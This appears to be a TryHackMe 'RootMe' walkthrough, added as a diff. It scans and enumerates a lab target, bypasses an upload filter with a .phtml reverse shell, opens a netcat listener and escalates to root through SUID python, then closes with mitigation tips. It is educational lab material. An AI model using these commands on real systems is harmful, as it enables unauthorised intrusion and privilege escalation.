@@ -1,0 +1,95 @@
+TryHackMe Walkthrough: RootMe
+
+By Adhith
+
+ Overview
+The RootMe room on TryHackMe is a beginner-friendly penetration testing lab that focuses on web exploitation and privilege escalation. It helps learners understand file upload vulnerabilities and basic Linux privilege escalation techniques.
+
+Objectives
+Gain initial access to the target machine
+Exploit a file upload vulnerability
+Escalate privileges to root
+ Tools Used
+Nmap
+Gobuster
+Netcat
+PHP reverse shell
+Linux commands
+Step 1: Reconnaissance
+We start by scanning the target machine using Nmap:
+
+nmap -sC -sV -oN scan.txt <TARGET_IP>
+ Results:
+Port 22 → SSH
+Port 80 → HTTP
+This indicates a web server is running.
+
+Step 2: Directory Enumeration
+We use Gobuster to find hidden directories:
+
+gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
+Findings:
+/uploads/
+/panel/
+The /panel/ directory contains a file upload form.
+
+Step 3: Exploiting File Upload
+We attempt to upload a PHP reverse shell.
+
+Problem:
+The server blocks .php files.
+
+Solution:
+Bypass the filter using:
+
+.phtml extension
+Steps:
+Download PHP reverse shell
+
+Write on Medium
+Edit IP and port
+
+Rename file to: shell.phtml
+
+Upload via /panel/
+
+Step 4: Getting Reverse Shell
+Start a listener:
+
+nc -lvnp 4444
+Access the uploaded file:
+
+http://<TARGET_IP>/uploads/shell.phtml
+We get a reverse shell!
+
+Step 5: Stabilizing Shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+Step 6: Privilege Escalation
+Search for SUID binaries:
+
+find / -perm -4000 -type f 2>/dev/null
+Interesting Binary:
+/usr/bin/python
+Step 7: Exploiting SUID Python
+Run:
+
+python -c 'import os; os.system("/bin/bash")'
+This gives us a root shell.
+
+Step 8: Capture Flags
+Navigate to root directory:
+
+cd /root
+cat root.txt
+Root access achieved!
+
+Key Learnings
+File upload vulnerabilities can be bypassed with alternative extensions
+Reverse shells are essential for gaining access
+SUID misconfigurations can lead to privilege escalation
+Mitigation Tips
+Validate file uploads properly (MIME type + extension)
+Disable execution in upload directories
+Monitor and restrict SUID binaries
+Conclusion
+The RootMe lab is an excellent starting point for beginners to understand real-world attack scenarios involving web exploitation and privilege escalation.
